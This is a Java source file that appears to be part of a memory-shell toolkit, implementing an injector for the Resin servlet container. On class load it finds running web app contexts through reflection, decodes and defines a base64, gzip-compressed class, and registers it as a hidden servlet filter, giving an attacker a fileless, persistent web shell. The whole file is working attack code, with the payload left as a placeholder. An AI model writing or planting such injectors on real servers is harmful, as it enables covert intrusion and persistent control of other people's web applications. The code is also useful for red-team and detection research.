package com.reajason.javaweb.memshell.injector.resin;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 */
public class ResinFilterInjector {

    static {
        new ResinFilterInjector();
    }

    public ResinFilterInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object filter = getShell(context);
                inject(context, filter);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public List<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", new Class[0], new Object[0]);
        for (Thread thread : threads) {
            Class<?> servletInvocationClass = null;
            try {
                servletInvocationClass = thread.getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
            } catch (Exception e) {
                continue;
            }
            if (servletInvocationClass != null) {
                Object contextRequest = servletInvocationClass.getMethod("getContextRequest").invoke(null);
                Object webApp = invokeMethod(contextRequest, "getWebApp", new Class[0], new Object[0]);
                contexts.add(webApp);
            }
        }
        return Arrays.asList(contexts.toArray());
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            return classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
            return clazz.newInstance();
        }
    }

    private void inject(Object context, Object filter) throws Exception {
        if (isInjected(context)) {
            System.out.println("filter already injected");
            return;
        }
        Class<?> filterMappingClass;
        try {
            filterMappingClass = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.FilterMapping");
        } catch (Exception e) {
            filterMappingClass = context.getClass().getClassLoader().loadClass("com.caucho.server.dispatch.FilterMapping");
        }
        Object filterMappingImpl = filterMappingClass.newInstance();
        invokeMethod(filterMappingImpl, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
        invokeMethod(filterMappingImpl, "setFilterClass", new Class[]{String.class}, new Object[]{getClassName()});
        Object urlPattern = invokeMethod(filterMappingImpl, "createUrlPattern", null, null);
        invokeMethod(urlPattern, "addText", new Class[]{String.class}, new Object[]{getUrlPattern()});
        invokeMethod(urlPattern, "init", null, null);
        invokeMethod(context, "addFilterMapping", new Class[]{filterMappingClass}, new Object[]{filterMappingImpl});
        invokeMethod(context, "clearCache", null, null);
        System.out.println("filter injected");
    }

    @SuppressWarnings("all")
    public boolean isInjected(Object context) throws Exception {
        Map<String, Object> filters = (Map) getFieldValue(getFieldValue(context, "_filterManager"), "_filters");
        for (String key : filters.keySet()) {
            if (key.contains(getClassName())) {
                return true;
            }
        }
        return false;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(name);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }

            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }
}